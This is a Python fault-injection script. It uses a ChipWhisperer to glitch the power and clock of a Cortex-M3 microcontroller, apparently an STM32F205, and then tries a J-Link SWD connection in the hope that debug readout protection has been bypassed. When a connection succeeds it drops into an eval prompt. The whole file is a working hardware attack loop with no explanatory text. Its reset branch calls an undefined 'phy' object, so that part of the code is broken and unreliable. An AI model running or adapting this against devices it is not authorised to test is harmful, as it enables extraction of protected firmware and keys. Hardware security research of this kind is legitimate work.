#!/usr/bin/env python3

import sys
import logging
import chipwhisperer as cw
import time
import pylink
import random

# phy = pw.Usb()
# phy.con()

print("Configuring CW")
logging.basicConfig(level = logging.WARN)

def initAll():
  global scope, target
  scope = cw.scope()
  target = cw.target(scope)
  scope.adc.samples = 3000
  scope.adc.offset = 0
  scope.adc.basic_mode = "rising_edge"
  scope.clock.clkgen_freq = 8000000 # 120000000 # 7370000
  scope.clock.adc_src = "clkgen_x1"
  scope.trigger.triggers = "tio4"
  scope.glitch.clk_src = "clkgen"
  scope.glitch.output = "enable_only"
  # scope.glitch.output = "glitch_only"
  scope.io.glitch_lp = False
  scope.io.glitch_hp = True
  # target.go_cmd = ""
  # target.key_cmd = ""
  scope.glitch.trigger_src = 'ext_single'

initAll()
trycounter = 0
CONFIG_TRY = 10000

print("Configuring JLink")
jlink = pylink.JLink()
jlink.open()

# gc = sparkgap.GlitchCore()
# gc.setRepeatRange(1,1,1)
# gc.setWidthRange(1,2,1)
# gc.setOffsetRange(1,49,1)
# gc.setExtOffsetRange(11000,11450,1)
# gc.lock()

# glitch out controls logic A, defaulting to enabled (i.e. glitch = no power)
scope.io.target_pwr = True

# Trying (try:108,wait:13110,width:1.562500,offset:13.281250,repeat:1)...
scope.glitch.ext_offset = 1300
# scope.glitch.ext_offset = 1300

EXT_OFF = 1300

no_power = 0
target.init()
trycounter = 0
while trycounter < CONFIG_TRY:
  # scope.io.pdic = "high"
  # phy.set_power_source("off")
  scope.io.target_pwr = False
  time.sleep(0.25)
  # x = gc.generateRandomFault()
  # (width,offset,ext,repeat) = x
  trycounter += 1
  scope.glitch.offset = 13.2
  scope.glitch.width = random.uniform(1.2,1.6) # 1.4
  scope.glitch.repeat = random.randint(1,2)
  # if trycounter % 10 == 0:
  #   scope.glitch.ext_offset += 1
  scope.glitch.ext_offset = EXT_OFF + random.randint(-3,300)
  print("Trying (try:%d,wait:%d,width:%f,offset:%f,repeat:%d)..." % (trycounter,scope.glitch.ext_offset,scope.glitch.width,scope.glitch.offset,scope.glitch.repeat))
  scope.arm()
  scope.io.target_pwr = True
  time.sleep(0.25)
  timeout = 100000
  while target.isDone() is False and timeout > 0:
    timeout -= 1
    time.sleep(0.01)
  if timeout == 0:
    print("scope timed out!")
  time.sleep(0.25)
  jlink.set_tif(pylink.enums.JLinkInterfaces.SWD)
  try:
    r = jlink.connect("Cortex-M3",verbose=True)
    # r = jlink.connect("STM32F205RG",verbose=True)
  except Exception as e:
    print(e,flush=True)
    if str(e) == "Target system has no power.":
      no_power += 1
      if no_power == 3:
        print("Three no_power's in a row, bye!")
        target.dis()
        scope.dis()
        sys.exit(0)
      print("Resetting...")
      target.dis()
      scope.dis()
      phy.set_power_source("off")
      time.sleep(5.0)
      initAll()
      phy.set_power_source("5V")
      time.sleep(5.0)
      print("Trying again...")
      continue
    no_power = 0
    r = False
  if r is False and r is not None:
    # scope.io.pdic = "high"
    scope.io.target_pwr = False
    time.sleep(0.25)
  else:
    print("Connected!")
    while True:
      x = eval(input("py > ").rstrip())

target.dis()
scope.dis()

print("Bye!")

